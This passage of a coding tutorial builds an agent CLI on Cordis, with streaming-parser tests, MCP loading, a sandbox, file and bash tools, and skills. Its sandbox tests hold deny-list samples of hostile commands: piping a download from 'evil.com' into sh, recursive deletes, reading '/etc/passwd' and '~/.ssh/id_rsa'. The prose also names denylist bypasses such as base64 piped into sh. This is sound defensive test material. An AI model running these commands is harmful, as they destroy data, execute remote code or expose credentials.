2. `ctx.agents.create({ name: 'cli-agent', sessionId, model, loop: ctx.agentLoop })`
3. Wrap readline in `ctx.effect`
4. Create an `AbortController` when running the agent; pass `signal` into `agent.send()`
5. On stdin, if it receives a **single byte** `0x1b` (Esc), call `abort()`. Arrow keys are `Esc [` sequences — longer than one byte, so don't cancel them
6. When cancelled, print `[cancelled]` — don't treat it as `[AgentError]`
7. Debug commands: `/tools` `/models` `/model` `/history` `/prompt` `/reset` `/exit`

`/reset` calls `ctx.sessions.clear(session.id)` — **don't** create a new session.

Streaming output conventions: thinking in grey `[Thinking]`; content prints `Agent > ` first; tool calls in cyan; tool results in green, truncated to 300 chars.

Startup copy is in English — compare against `src/plugins/cli.js`. No bash/file yet on Day 5 — `/tools` may be empty.

### Same-day tests (no real API)

Three into `test/core.test.js`, titles identical to this repo's. All three test the DeepSeek adapter's stream parsing directly with no network, so export `parseSSE`, `accumulateToolCallDelta`, `finalizeToolCalls` and `parseToolArguments` to make them importable. Key points:

1. `streamed tool_calls concatenate name once, not read_fileread_file`: feed two deltas at `index: 0` — the first carrying `id` + `function.name` + empty arguments, the second carrying only an arguments fragment — and assert name, id and arguments all landed. Then feed `name: 'ba'` and `name: 'sh'` as two deltas and assert the result is `bash`. The bug being guarded against is re-assigning the whole name on every delta, which produces `read_fileread_file`.
2. `parseSSE flushes a last line without a trailing newline and recognizes data:[DONE]`: hand-roll a fake `response.body.getReader()` returning two encoded chunks, the second **without** a trailing `\n`, and assert both events come out. A parser that only emits on a newline silently swallows the last token of every stream.
3. `finalizeToolCalls sorts by index, drops empty names, and throws on invalid JSON`: accumulate index 1, then index 0, then an index 2 that has arguments `'{'` and no name. Assert the output is sorted (`read_file` before `grep`), the nameless entry was dropped, and arguments came back parsed. Then assert `parseToolArguments('')` is `{}` while a truncated `'{"path":'` throws `/incomplete tool arguments JSON/` — an empty string means the model called with no arguments, truncated JSON means a broken stream, and the two must not be conflated.

```js
test('streamed tool_calls concatenate name once, not read_fileread_file', async () => {
  const { accumulateToolCallDelta } = await import('../src/models/deepseek.js')
  const map = new Map()

  accumulateToolCallDelta(map, {
    index: 0,
    id: 'call_1',
    function: { name: 'read_file', arguments: '' },
  })
  accumulateToolCallDelta(map, {
    index: 0,
    function: { arguments: '{"path":"README.md"}' },
  })

  assert.equal(map.get(0).name, 'read_file')
  assert.equal(map.get(0).id, 'call_1')
  assert.equal(map.get(0).arguments, '{"path":"README.md"}')

  const streamed = new Map()
  accumulateToolCallDelta(streamed, { index: 0, function: { name: 'ba' } })
  accumulateToolCallDelta(streamed, { index: 0, function: { name: 'sh' } })
  assert.equal(streamed.get(0).name, 'bash')
})

test('parseSSE flushes a last line without a trailing newline and recognizes data:[DONE]', async () => {
  const { parseSSE } = await import('../src/models/deepseek.js')
  const encoder = new TextEncoder()
  const chunks = [
    'data: {"choices":[{"delta":{"content":"Hel"}}]}\n',
    'data: {"choices":[{"delta":{"content":"lo"}}]}',
  ]
  let i = 0
  const response = {
    body: {
      getReader() {
        return {
          async read() {
            if (i >= chunks.length) return { done: true, value: undefined }
            return { done: false, value: encoder.encode(chunks[i++]) }
          },
          releaseLock() {},
        }
      },
    },
  }

  const events = []
  for await (const event of parseSSE(response)) events.push(event)
  assert.equal(events.length, 2)
  assert.equal(events[0].choices[0].delta.content, 'Hel')
  assert.equal(events[1].choices[0].delta.content, 'lo')
})

test('finalizeToolCalls sorts by index, drops empty names, and throws on invalid JSON', async () => {
  const { accumulateToolCallDelta, finalizeToolCalls, parseToolArguments } = await import(
    '../src/models/deepseek.js'
  )

  const map = new Map()
  accumulateToolCallDelta(map, {
    index: 1,
    id: 'b',
    function: { name: 'grep', arguments: '{"q":"x"}' },
  })
  accumulateToolCallDelta(map, {
    index: 0,
    id: 'a',
    function: { name: 'read_file', arguments: '{"path":"a"}' },
  })
  accumulateToolCallDelta(map, { index: 2, function: { arguments: '{' } })

  const calls = finalizeToolCalls(map)
  assert.equal(calls.length, 2)
  assert.equal(calls[0].name, 'read_file')
  assert.equal(calls[1].name, 'grep')
  assert.deepEqual(calls[0].arguments, { path: 'a' })

  assert.deepEqual(parseToolArguments(''), {})
  assert.throws(() => parseToolArguments('{"path":'), /incomplete tool arguments JSON/)
})
```

### Assembly

```js
import { Context } from '@deepseek-ai/cordis'
import dotenv from 'dotenv'

import * as sessions from './plugins/sessions.js'
import * as systemPrompt from './plugins/system-prompt.js'
import * as tools from './plugins/tools.js'
import * as llm from './plugins/llm.js'
import * as agents from './plugins/agents.js'
import * as agentLoop from './plugins/agent-loop.js'
import * as runtimeContext from './plugins/runtime-context.js'
import * as deepseek from './models/deepseek.js'
import * as cli from './plugins/cli.js'

dotenv.config()

const root = new Context()
const workspace = process.env.MINI_DSH_WORKSPACE ?? process.cwd()

await root.plugin(sessions)
await root.plugin(systemPrompt)
await root.plugin(tools)
await root.plugin(llm)
await root.plugin(agents)
await root.plugin(agentLoop)

await root.plugin(runtimeContext, { workspace })
await root.plugin(deepseek)
await root.plugin(cli, {
  model: process.env.MINI_DSH_MODEL ?? 'deepseek/deepseek-v4-pro',
})
```

`pnpm start` should enter the CLI. `/prompt` should contain identity plus current time / workspace. Esc should cancel a run.

Compare: `.env.example`, `src/models/deepseek.js`, `src/plugins/runtime-context.js`, `src/plugins/cli.js`, `src/index.js`

---

## Day 6: external plugins / MCP

The goal is not to learn Context7 — it's to prove that as long as the `ctx.tools.register()` contract is right, the official `@deepseek-ai/dsh-mcp-client` plugs in as-is.

The Agent Loop still has no `if (mcp)` branch. Still no sandbox / Bash / files.

Day 6 adds **no** `pnpm test`. Cumulative stays 13.

### Files to write today

```text
plugins.config.js
src/plugins/external-plugins.js
src/index.js
```

```bash
pnpm add @deepseek-ai/dsh-mcp-client@0.1.1-rc.2
```

Context7 **must be optional**. `mcp.context7.com` frequently dies with TLS `ECONNRESET`, and a learning project shouldn't fail to start because of it:

```js
const headers = {}
if (process.env.CONTEXT7_API_KEY) {
  headers.Authorization = `Bearer ${process.env.CONTEXT7_API_KEY}`
}

export default [
  {
    package: '@deepseek-ai/dsh-mcp-client',
    required: false,
    config: {
      serverName: 'context7',
      transport: 'streamable-http',
      url: 'https://mcp.context7.com/mcp',
      headers,
      failOnStartupError: false,
      toolCallTimeoutMs: 60_000,
    },
  },
]
```

`src/plugins/external-plugins.js`: dynamic `import(entry.package)`, `await ctx.plugin(mod, config)`. On failure, print `[plugin] failed`; only rethrow if `entry.required`. You must `await fiber` — otherwise the CLI appears first, before the tools are registered.

`plugins.config.js` must be dynamically imported **after** `dotenv.config()`, or `CONTEXT7_API_KEY` won't be read.

After startup: if connected, `/tools` has `mcp__context7__*`; if not, only a failure log and you must **still reach `User >`**.

Compare: `src/plugins/external-plugins.js`, `plugins.config.js`, `src/index.js`

---

## Day 7: compare and wrap up

No new files and no new tests today. Cumulative is still **13**.

Open the README, don't look at `src/` yet — confirm you can draw the request path from memory and can restate this: the Agent Loop doesn't know DeepSeek, doesn't know MCP, doesn't know Bash. It only knows `ctx.tools` / `ctx.llm` / `ctx.sessions`.

Run through the main-track acceptance by hand. `pnpm test` all green (13), `pnpm check` passing, and the CLI answers — the eight-day main track is done.

To also write the path gate, Approval, `read_file` / `bash`, do the **Supplement**. That part takes the tests from 13 to 22. Skills are a second supplement (22 → 26) and still do not change the Agent Loop.


---

## Supplement: real tools + application-level sandbox

After the main track. The Agent Loop **doesn't change one line**.

### Files to write

```text
src/utils/path.js
src/core/sandbox-runtime.js
src/plugins/sandbox.js
src/tools/files.js
src/tools/bash.js
src/plugins/cli.js         # inject sandbox + Approval; Esc pauses during approval
src/index.js
test/core.test.js          # add 7 tests
test/integration.test.js   # new file: 2 tests on a real Cordis Context
```

### 1. The path gate

`isInside(workspace, target)` / `resolveInside(workspace, requested)`.

Resolve first, then test with `path.relative`. Don't use `startsWith('..')` — `..hidden` would be falsely killed. Errors in English: `path must be a string`, `path escapes the workspace`.

Then check containment a **second** time, through `fs.realpathSync`. A lexical check never asks the filesystem what a path really is, so a symlink sitting inside the workspace and pointing at `/etc` sails through as `workspace/link/passwd`. This second check is what makes the gate an actual allowlist instead of a nicer-looking denylist.

Two details decide whether it works:

- **Resolve the root too** — compare realpath against realpath. On macOS `/tmp` is itself a symlink to `/private/tmp`, so resolving only one side rejects every legitimate path under it.
- **Handle a target that doesn't exist yet.** A write or a create names a file that isn't there, and `realpathSync` throws on it. Walk up to the longest existing prefix, resolve that, then re-attach the missing segments. Skip this and the gate covers reads while quietly waving writes through — exactly backwards.

Return the **lexical** path, not the resolved one: errors and tool output should speak in the paths the user typed, and the resolved form turns every `/tmp` path into `/private/tmp` on macOS. The second escape gets its own message: `path escapes the workspace through a symlink`.

### 2. SandboxRuntime

Only three jobs: path gate, command policy, Approval. Not container isolation.

Get the ordering right while you write it, because the code will not make it obvious. The command policy is a **denylist**, so it is incomplete by construction — `echo <base64> | base64 -d | sh`, `python3 -c '...'` and `node -e '...'` all sail past it, and no amount of extra patterns changes that. The path gate is allowlist-shaped and therefore stronger, and it does hold — but only because it resolves symlinks as well as `../`; a purely lexical version would let a link inside the workspace point straight out of it. **Approval is the actual boundary**; the other two only decide what reaches the human. Write the command policy to catch accidents, not attackers.

`approve(request)`:

- `autoApprove=true` → `{ approved: true, source: 'auto' }`
- otherwise consult `setApprover(fn)`
- no approver → throw `write requires user approval, but no approval channel is set`
- approver returns falsy → throw `user rejected this operation`

The command policy must pass this repo's tests. Deny messages in English so the test regexes match, e.g.:

- `recursive delete`
- `sudo/su is blocked`
- `unauthorized outbound request`
- `piping curl/wget into a shell`
- `system path is blocked`
- `.. path escape is blocked`
- `path escapes the workspace`

The allow/deny case set: compare against the `Sandbox blocks dangerous commands...` test in `test/core.test.js`. Don't delete cases.

Wrap it as `ctx.sandbox`. Also add the `sandbox:policy` `section` with `order: 15` to the system prompt (in English).

`autoApprove` reads `config.autoApprove ?? process.env.MINI_DSH_AUTO_APPROVE === '1'`.

### 3. file / bash tools

Five file tools: `read_file` `write_file` `edit_file` `glob` `grep`. `approve` before writes and edits. `oldText` not found → `oldText not found`; not unique → `oldText is not unique; refusing an ambiguous edit`.

`matchFilePattern` **must be exported**. Don't write literals like `**/*.md` inside block comments — they would close the `*/` early.

bash: `assertCommand` first, then `approve`, then `spawn('bash', ['-lc', command], { cwd: workspace })`. Empty command → `command is required`. Listen to `exec.signal`: kill the child on abort. Timeout 30s, output truncated to 32KB.

### CLI approval

1. Add `'sandbox'` to `inject`
2. On startup print the sandbox workspace and `Writes and bash execution ask [Y/n] first. Press Esc to cancel a run.`
3. Wire `setApprover` to `askApproval`. Turn `running` off during approval so Esc and `Y/n` don't fight over input
4. On dispose: `disposeApprover()` first, then `rl.close()`

`askApproval`: `Allow this? [Y/n]` — empty enter or `y` / `yes` approves; anything else prints `rejected.`

### Supplement tests

Seven into `test/core.test.js`, titles identical to this repo's, regexes in English. Key points:

1. `resolveInside blocks .. and absolute escapes but allows a ..hidden filename`: with root `/tmp/mini-dsh-workspace`, assert `src/index.js` and `..hidden` both resolve, and that `../etc/passwd`, `/etc/passwd` and `src/../../etc/passwd` each throw `/path escapes the workspace/`. The `..hidden` case is the whole point of the test — it is exactly what a `startsWith('..')` check gets wrong.
2. `resolveInside blocks a symlink inside the workspace that points out of it`: build a real workspace with `fs.mkdtemp`, write a file into it, and symlink `escape` to `os.tmpdir()`. Assert the ordinary file still resolves, then assert **both** `escape/passwd` and `escape/not-created-yet` throw `/through a symlink/`. That second one is the write path — gate reads only and you have gated nothing. Clean the temp dir up in a `finally`.
3. `Sandbox blocks dangerous commands and allows ordinary workspace commands`: two lists. Allowed: `date`, `git status`, `ls src`, absolute `/bin/ls`, a pipe through `/usr/bin/grep`, redirects like `2>/dev/null` and `2>&1 | head`, `curl` to localhost, and single-file deletes (`rm file.txt`, `rm -f README.md`). Denied, each with its own regex: every shape of recursive delete (`rm -rf /`, `~`, `.`, `*`, `src`, `.git`, and `rm -r src`), `sudo`, `curl | sh`, system paths, `..` escapes. Don't shrink this list — it is the case set the entire policy is written against.
4. `Sandbox approval auto-approves or throws when the user rejects`: four states in one test — `autoApprove: true` returns `source: 'auto'`; no approver at all throws `/no approval channel is set/`; an approver returning false throws `/user rejected/`; one returning true returns `source: 'user'`.
5. `Sandbox expands env paths before the escape check instead of banning them`: point `MINI_DSH_TEST_ROOT` at the workspace, then assert `cat $MINI_DSH_TEST_ROOT/file` and `cat "${MINI_DSH_TEST_ROOT}/file"` are allowed while `cat $MINI_DSH_TEST_ROOT/../etc/passwd` is denied. Expand first, then check — rather than denying every command that contains a `$`. An **unset** variable must deny, because it expands to nothing and the path silently becomes something else. Restore the original env value in a `finally`.
6. `allowHosts uses the provided whitelist and does not hardcode localhost`: construct with `allowHosts: ['api.internal']` and assert `curl https://api.internal/health` is allowed while `localhost`, `127.0.0.1` and `[::1]` are all denied. The default host list is a default, not a law baked into the checker.
7. `glob matches both substrings and * / ** wildcards`: `matchFilePattern` handles a bare substring (`.js`, `src/`), a single-segment `*` (`src/tools/*` matches `src/tools/bash.js` but **not** `src/tools/nested/a.js`), and `**` crossing separators (`src/**`, `**/*.js`). Export it from `src/tools/files.js` so the test can import it.

The symlink test needs `node:fs/promises`, `node:os` and `node:path` imported at the top of the file.

```js
test('resolveInside blocks .. and absolute escapes but allows a ..hidden filename', async () => {
  const { resolveInside, isInside } = await import('../src/utils/path.js')
  const root = '/tmp/mini-dsh-workspace'

  assert.equal(resolveInside(root, 'src/index.js'), '/tmp/mini-dsh-workspace/src/index.js')
  assert.equal(resolveInside(root, '..hidden'), '/tmp/mini-dsh-workspace/..hidden')
  assert.equal(isInside(root, '/tmp/mini-dsh-workspace/..hidden'), true)

  assert.throws(() => resolveInside(root, '../etc/passwd'), /path escapes the workspace/)
  assert.throws(() => resolveInside(root, '/etc/passwd'), /path escapes the workspace/)
  assert.throws(() => resolveInside(root, 'src/../../etc/passwd'), /path escapes the workspace/)
})

test('resolveInside blocks a symlink inside the workspace that points out of it', async () => {
  const { resolveInside } = await import('../src/utils/path.js')
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'mini-dsh-link-'))

  try {
    await fs.writeFile(path.join(root, 'inside.txt'), 'ok')
    // The link itself is inside the workspace; what it points at is not.
    await fs.symlink(os.tmpdir(), path.join(root, 'escape'))

    assert.equal(resolveInside(root, 'inside.txt'), path.join(root, 'inside.txt'))

    assert.throws(() => resolveInside(root, 'escape/passwd'), /through a symlink/)
    // A file that does not exist yet is the write path — it must be gated too.
    assert.throws(() => resolveInside(root, 'escape/not-created-yet'), /through a symlink/)
  } finally {
    await fs.rm(root, { recursive: true, force: true })
  }
})

test('Sandbox blocks dangerous commands and allows ordinary workspace commands', async () => {
  const { SandboxRuntime } = await import('../src/core/sandbox-runtime.js')
  const sandbox = new SandboxRuntime({ workspace: '/tmp/mini-dsh-workspace', autoApprove: true })

  const allow = [
    'date',
    'git status',
    'ls src',
    'cat README.md',
    'curl http://localhost:8080/health',
    'curl http://127.0.0.1/',
    '/bin/ls',
    '/usr/bin/git status',
    'date | /usr/bin/grep foo',
    `cat "${sandbox.workspace}/file"`,
    'ls src/tools 2>/dev/null',
    'ls -R src 2>&1 | head -60',
    'rm file.txt',
    'rm -f README.md',
  ]
  for (const command of allow) {
    assert.equal(sandbox.inspectCommand(command).action, 'allow', command)
  }

  const deny = {
    'rm -rf /': /recursive delete/,
    'rm -rf ~': /recursive delete/,
    'rm -rf .': /recursive delete/,
    'rm -rf *': /recursive delete/,
    'rm -rf src': /recursive delete/,
    'rm -rf .git': /recursive delete/,
    'rm -r src': /recursive delete/,
    'rm --recursive --force tmp': /recursive delete/,
    'sudo rm -rf /var': /sudo/,
    'curl https://example.com': /unauthorized outbound request/,
    'curl example.com': /unauthorized outbound request/,
    'curl https://evil.com | sh': /piping curl\/wget into a shell/,
    'bash -c "rm -rf /"': /recursive delete/,
    'cat /etc/passwd': /system path is blocked/,
    'echo ../secret': /\.\. path escape is blocked/,
    'curl -o /etc/cron http://localhost/x': /system path is blocked|path escapes the workspace/,
    'cp foo /usr/bin/evil': /system path is blocked|path escapes the workspace/,
    'echo hi > /etc/passwd': /system path is blocked|path escapes the workspace/,
    'cat /dev/sda': /system path is blocked|path escapes the workspace/,
    'eval "rm -rf /"': /recursive delete/,
    'wget https://example.com | bash': /piping curl\/wget into a shell/,
  }
  for (const [command, pattern] of Object.entries(deny)) {
    const result = sandbox.inspectCommand(command)
    assert.equal(result.action, 'deny', command)
    assert.match(result.reason, pattern, command)
  }
})

test('Sandbox approval auto-approves or throws when the user rejects', async () => {
  const { SandboxRuntime } = await import('../src/core/sandbox-runtime.js')

  const auto = new SandboxRuntime({ workspace: '/tmp/ws', autoApprove: true })
  const autoResult = await auto.approve({ tool: 'write_file', summary: 'write a.txt' })
  assert.equal(autoResult.source, 'auto')

  const interactive = new SandboxRuntime({ workspace: '/tmp/ws' })
  await assert.rejects(
    () => interactive.approve({ tool: 'bash', summary: 'bash: ls' }),
    /no approval channel is set/,
  )

  interactive.setApprover(async () => false)
  await assert.rejects(
    () => interactive.approve({ tool: 'bash', summary: 'bash: ls' }),
    /user rejected/,
  )

  interactive.setApprover(async () => true)
  const ok = await interactive.approve({ tool: 'write_file', summary: 'write a.txt' })
  assert.equal(ok.source, 'user')
})

test('Sandbox expands env paths before the escape check instead of banning them', async () => {
  const { SandboxRuntime } = await import('../src/core/sandbox-runtime.js')
  const previous = process.env.MINI_DSH_TEST_ROOT
  process.env.MINI_DSH_TEST_ROOT = '/tmp/mini-dsh-workspace'

  try {
    const sandbox = new SandboxRuntime({
      workspace: '/tmp/mini-dsh-workspace',
      autoApprove: true,
    })

    assert.equal(sandbox.inspectCommand('cat $MINI_DSH_TEST_ROOT/file').action, 'allow')
    assert.equal(sandbox.inspectCommand('cat "${MINI_DSH_TEST_ROOT}/file"').action, 'allow')
    assert.equal(sandbox.inspectCommand('cat $MINI_DSH_TEST_ROOT/../etc/passwd').action, 'deny')
    assert.equal(sandbox.inspectCommand('cat $MINI_DSH_UNSET_VAR/file').action, 'deny')

    if (process.env.HOME) {
      const homeWorkspace = `${process.env.HOME}/mini-dsh-workspace`
      const homeSandbox = new SandboxRuntime({ workspace: homeWorkspace, autoApprove: true })
      assert.equal(
        homeSandbox.inspectCommand('cat "$HOME/mini-dsh-workspace/file"').action,
        'allow',
      )
      assert.equal(homeSandbox.inspectCommand('cat "$HOME/.ssh/id_rsa"').action, 'deny')
    }
  } finally {
    if (previous === undefined) delete process.env.MINI_DSH_TEST_ROOT
    else process.env.MINI_DSH_TEST_ROOT = previous
  }
})

test('allowHosts uses the provided whitelist and does not hardcode localhost', async () => {
  const { SandboxRuntime } = await import('../src/core/sandbox-runtime.js')
  const locked = new SandboxRuntime({
    workspace: '/tmp/mini-dsh-workspace',
    autoApprove: true,
    allowHosts: ['api.internal'],
  })

  assert.equal(locked.inspectCommand('curl https://api.internal/health').action, 'allow')
  assert.equal(locked.inspectCommand('curl http://localhost/').action, 'deny')
  assert.equal(locked.inspectCommand('curl http://127.0.0.1/').action, 'deny')
  assert.equal(locked.inspectCommand('curl http://[::1]/').action, 'deny')
})

test('glob matches both substrings and * / ** wildcards', async () => {
  const { matchFilePattern } = await import('../src/tools/files.js')

  assert.equal(matchFilePattern('src/tools/bash.js', '.js'), true)
  assert.equal(matchFilePattern('src/tools/bash.js', 'src/'), true)
  assert.equal(matchFilePattern('src/tools/bash.js', 'src/tools/*'), true)
  assert.equal(matchFilePattern('src/plugins/cli.js', 'src/tools/*'), false)
  assert.equal(matchFilePattern('src/tools/nested/a.js', 'src/tools/*'), false)
  assert.equal(matchFilePattern('src/index.js', 'src/**'), true)
  assert.equal(matchFilePattern('src/tools/bash.js', 'src/**'), true)
  assert.equal(matchFilePattern('README.md', '*.md'), true)
  assert.equal(matchFilePattern('docs/guide.md', '*.md'), true)
  assert.equal(matchFilePattern('src/tools/bash.js', '**/*.js'), true)
  assert.equal(matchFilePattern('README.md', '**/*.js'), false)
})
```

That file is then at **20**.

### The integration test: boot the whole stack

Everything up to here is unit-tested against hand-rolled fakes, which never checks the one thing Cordis makes easiest to get wrong: **the wiring**. A misspelled `inject` name, a service registered in the wrong order, an `ctx.effect` that never runs — all of that passes every test in `core.test.js`, and only shows up when you run `pnpm start`.

So add a second file, `test/integration.test.js`, that fakes nothing about the harness — a real `new Context()`, every plugin mounted in `index.js` order, and only the model provider mocked. Two tests:

1. `the whole plugin stack boots on Cordis and runs a full model -> tool -> model turn` — mount sessions / systemPrompt / tools / llm / agents / agentLoop / runtimeContext / sandbox (`autoApprove: true`) / bash / files against a temp workspace. Assert every `ctx.*` service is present, assert the registered tool names are exactly the expected set (this is what catches a tool plugin whose `ctx.effect` never fired), then run one full turn against a mock provider and check the event types written to the session log.
2. `external plugin loader tolerates an optional failure and enforces a required one` — an entry that throws with `optional: true` must not stop the boot; the same entry marked required must reject.

Use `fs.mkdtemp` under `os.tmpdir()` for the workspace and remove it in a `finally`, so the test never writes into the repo.

```js
test('the whole plugin stack boots on Cordis and runs a full model -> tool -> model turn', async () => {
  const workspace = await fs.mkdtemp(path.join(os.tmpdir(), 'mini-dsh-smoke-'))
  const root = new Context()

  try {
    await root.plugin(sessions)
    await root.plugin(systemPrompt)
    await root.plugin(tools)
    await root.plugin(llm)
    await root.plugin(agents)
    await root.plugin(agentLoop)
    await root.plugin(runtimeContext, { workspace })
    await root.plugin(sandbox, { workspace, autoApprove: true })
    await root.plugin(bash, { workspace })
    await root.plugin(files, { workspace })

    // Services were registered by plugins, not constructed by hand.
    assert.ok(root.sessions)
    assert.ok(root.systemPrompt)
    assert.ok(root.tools)
    assert.ok(root.llm)
    assert.ok(root.agents)
    assert.ok(root.agentLoop)
    assert.ok(root.sandbox)

    // ctx.effect-based registrations from runtime-context/sandbox/tools all ran.
    const toolNames = root.tools
      .list()
      .map(tool => tool.name)
      .sort()
    assert.deepEqual(toolNames, [
      'bash',
      'edit_file',
      'glob',
      'grep',
      'read_file',
      'write_file',
    ])

    const prompt = await root.systemPrompt.assemble({ step: 0 })
    assert.match(prompt, /You are a general-purpose agent/)
    assert.match(prompt, /## Runtime Context/)
    assert.match(prompt, /## Sandbox/)
    assert.match(prompt, new RegExp(workspace))

    let calls = 0
    root.llm.register(
      'mock',
      {
        models: ['smoke'],
        async chat({ system, messages, tools: schemas }) {
          calls += 1
          if (calls === 1) {
            // Tool schemas reach the provider through the loop's ctx.tools.schemas().
            assert.ok(schemas.some(tool => tool.function?.name === 'bash'))
            assert.ok(system.includes('Runtime Context'))
            return {
              toolCalls: [{ id: 't1', name: 'bash', arguments: { command: 'pwd' } }],
            }
          }
          const toolMessage = messages.at(-1)
          assert.equal(toolMessage.role, 'tool')
          assert.match(toolMessage.content, /mini-dsh-smoke/)
          return { content: 'done', toolCalls: [] }
        },
      },
      { defaultModel: 'smoke' },
    )

    assert.equal(root.llm.defaultSelection(), 'mock/smoke')
    assert.deepEqual(root.llm.models(), ['mock/smoke'])

    const session = root.sessions.create({ source: 'smoke' })
    const agent = root.agents.create({
      name: 'smoke',
      sessionId: session.id,
      model: 'mock/smoke',
      loop: root.agentLoop,
    })

    const answer = await agent.send('print the working directory')
    assert.equal(answer, 'done')
    assert.equal(calls, 2)

    const types = root.sessions.get(session.id).events.map(event => event.type)
    assert.deepEqual(types, [
      'session/start',
      'user/message',
      'assistant/tool_calls',
      'tool/result',
      'assistant/message',
    ])
  } finally {
    await root.fiber.dispose()
    await fs.rm(workspace, { recursive: true, force: true })
  }
})

test('external plugin loader tolerates an optional failure and enforces a required one', async () => {
  const root = new Context()
  const originalLog = console.log
  const originalError = console.error
  const entries = [{ package: 'mini-dsh-definitely-not-installed', required: false }]

  console.log = () => {}
  console.error = () => {}
  try {
    // Optional entry: the host keeps booting and only logs a failure.
    await root.plugin(externalPlugins, { entries })

    // Required entry: apply() rethrows and the plugin load fails loudly.
    // ctx.plugin() returns a Fiber (not a Promise), so await it first.
    await assert.rejects(async () => {
      await root.plugin(externalPlugins, {
        entries: [{ ...entries[0], required: true }],
      })
    })
  } finally {
    console.log = originalLog
    console.error = originalError
    await root.fiber.dispose()
  }
})
```

When done, `pnpm test` totals **22**.

### Assembly

```js
await root.plugin(runtimeContext, { workspace })
await root.plugin(sandbox, { workspace })
await root.plugin(deepseek)
await root.plugin(bash, { workspace })
await root.plugin(files, { workspace })
await root.plugin(externalPlugins, { entries: externalConfig })
await root.plugin(cli, {
  model: process.env.MINI_DSH_MODEL ?? 'deepseek/deepseek-v4-pro',
})
```

This is the sandbox Supplement's `src/index.js`. `/prompt` now shows identity, sandbox policy, and runtime context together. `/tools` has `bash` / `read_file`; `mcp__context7__*` only if Context7 is connected. Skills mount after this.

---

## Skills: catalog + on-demand loader

After the sandbox Supplement. The Agent Loop **still doesn't change one line**. Official DSH keeps skill bodies out of the system prompt; mini does the same.

### Files to write

```text
src/core/skill-runtime.js
src/core/skill-filesystem.js
src/plugins/skills.js
src/plugins/skill-filesystem.js
src/tools/skill.js
src/plugins/cli.js         # /skills
src/index.js
test/core.test.js          # add 4 tests
.dsh/skills/hello-workspace/SKILL.md
```

### 1. SkillRuntime

`registerProvider(provider)` / `register(skill)` return disposers. `list()` returns summaries sorted by name. `get(name)` asks the winning provider so file-backed bodies are reread.

Duplicate names keep the **lower rank**. Project `.dsh/skills` is rank 100; runtime `register()` is 250. Invalid kebab-case names: `^[a-z0-9]+(?:-[a-z0-9]+)*$`.

`parseSkillMarkdown` requires YAML frontmatter with `name` and `description`. Invocation flags are kebab-case only:

- `disable-model-invocation` (default false → model can load)
- `user-invocable` (default true)
- camelCase keys (`userInvocable`) throw

Don't pull in a YAML library — a few scalar lines are enough.

### 2. FileSystemSkillProvider

Scan, in rank order:

- `<gitRoot>/.dsh/skills` (100)
- `<gitRoot>/.agents/skills` (200)
- optional `extraDirs` (300)

Accept `<name>/SKILL.md` bundles and flat `<name>.md`. Nested `**/SKILL.md` is **not** discovered. Missing roots are empty, not errors. Unreadable / invalid files are skipped.

Project root = nearest ancestor with `.git`; without one, the workspace cwd.

### 3. skill tool + catalog fragment

Register `skill({ name })` on `ctx.tools`. Unknown / non-model-invocable names throw in English so the tests match. Render:

```text
<skill_content name="...">
<skill_resources>…</skill_resources>   # only when resourceBase is a directory
<skill_instructions>
body
</skill_instructions>
</skill_content>
```

Mini has no `agent/pre-step` inject, so the catalog is a `systemPrompt.context` named `skills:catalog` with `order: 20`. Empty catalog → empty string (assemble already skips blanks). Summaries only: name + description, max 500 characters.

### CLI

Add `/skills` to the command list and `inject`. Print `name [source/model,user]: description`.

### Assembly (after sandbox)

```js
await root.plugin(skills)
await root.plugin(skillFilesystem, { workspace })
await root.plugin(skill)
```

`/prompt` then includes the Skills section when any model-invocable skill exists. `/tools` shows `skill`.

### Skills tests

Four tests into `test/core.test.js`, titles identical to this repo's. Key points:

1. `SkillRuntime register returns a disposer and lower rank wins duplicate names`: register a runtime skill named `hello-workspace`, then register a provider that offers the same name at rank 100. Assert `list()` returns one entry and it is the **provider's** description — lower rank wins — and that `get()` goes back to the provider for the body rather than serving a cached copy. After disposing the runtime registration the count stays 1, because the provider's copy was the one winning all along.
2. `parseSkillMarkdown reads kebab-case invocation flags and rejects camelCase keys`: parse frontmatter with `disable-model-invocation: false` and `user-invocable: false` and assert the flags land on `invocation`. Then assert three rejections: no frontmatter returns `undefined`, a camelCase `userInvocable` throws `/user-invocable/`, and a non-kebab name throws `/invalid skill name/`. Being strict about the key spelling is the point — a silently ignored `userInvocable` would leave a skill model-invocable when the author meant the opposite.
3. `FileSystemSkillProvider discovers bundle and flat skills and skips invalid files`: build a temp project with `.git`, then put four things under `.dsh/skills/` — a `hello-workspace/SKILL.md` bundle, a flat `flat-note.md`, a `broken.md` with no frontmatter, and a `nested/too-deep/SKILL.md`. Assert exactly `['flat-note', 'hello-workspace']` are found: invalid files are skipped rather than throwing, and discovery is **not** recursive. Clean the temp dir in a `finally`.
4. `skill tool loads model-invocable bodies and rejects unknown or user-only names`: register one ordinary skill and one with `modelInvocable: false`. Assert the body loads and the render includes `<skill_resources>`, then assert three rejections — unknown name, user-only skill, and a non-kebab name. This is the gate that keeps the catalog honest: a name in the list is not by itself permission to load it.

```js
test('SkillRuntime register returns a disposer and lower rank wins duplicate names', async () => {
  const { SkillRuntime, isModelInvocable } = await import('../src/core/skill-runtime.js')
  const skills = new SkillRuntime()

  const dispose = skills.register({
    name: 'hello-workspace',
    description: 'runtime copy',
    content: 'from register()',
  })

  skills.registerProvider({
    name: 'disk',
    async list() {
      return [
        {
          name: 'hello-workspace',
          description: 'project copy',
          invocation: { modelInvocable: true, userInvocable: true },
          source: 'project-dsh',
          provider: 'disk',
          rank: 100,
          locator: { path: '/tmp/hello/SKILL.md', directory: '/tmp/hello' },
        },
      ]
    },
    async get(candidate) {
      return { ...candidate, content: 'from disk' }
    },
  })

  const listed = await skills.list()
  assert.equal(listed.length, 1)
  assert.equal(listed[0].description, 'project copy')
  assert.equal(isModelInvocable(listed[0]), true)
  assert.equal((await skills.get('hello-workspace')).content, 'from disk')

  dispose()
  assert.equal((await skills.list()).length, 1)
})

test('parseSkillMarkdown reads kebab-case invocation flags and rejects camelCase keys', async () => {
  const { parseSkillMarkdown, parseFrontmatter } = await import('../src/core/skill-runtime.js')

  const parsed = parseSkillMarkdown(
    [
      '---',
      'name: model-only-skill',
      'description: Only the model may load this.',
      'disable-model-invocation: false',
      'user-invocable: false',
      'whenToUse: routing hint',
      '---',
      '',
      'Body here.',
      '',
    ].join('\n'),
  )

  assert.equal(parsed.name, 'model-only-skill')
  assert.equal(parsed.whenToUse, 'routing hint')
  assert.equal(parsed.invocation.modelInvocable, true)
